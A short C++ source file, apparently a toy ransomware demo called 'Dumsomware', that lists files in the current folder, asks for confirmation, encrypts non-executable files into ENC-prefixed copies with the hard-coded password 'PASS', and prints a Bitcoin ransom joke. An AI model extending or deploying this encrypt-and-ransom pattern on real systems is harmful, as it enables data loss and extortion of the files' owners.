// Dumsomware.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "FileSystemHelper.h"
#include "Crypt.h"
#include <string>
#include <iostream>
#include <list>

using std::list;
using std::wstring;

int main()
{
	char ans;
	wstring here(L".");
	list<wstring> res = FileSystemHelper::getAllFilesInDir(here);

	for each (wstring file in res)
	{
		std::wcout << file << std::endl;
	}

	std::wcout << "Encrypt files?" << std::endl;
	std::cin >> ans;
	
	//Crypt::encryptFile(L"C:\\Users\\noam\\Documents\\t.txt", L"C:\\Users\\noam\\Documents\\ENCt.txt", L"PASS");
	if (ans == 'y') {
		for each (wstring file in res)
		{
			if (file.find(L".exe") == wstring::npos) {
				std::wcout << "Encrypt file: " << file << std::endl;
				Crypt::encryptFile(file, L"ENC" + file, L"PASS");
			}
		}
	}

	std::wcout << "Give Me Bitcoin... ;)" << std::endl;
	std::cin >> ans;
    return 0;
}

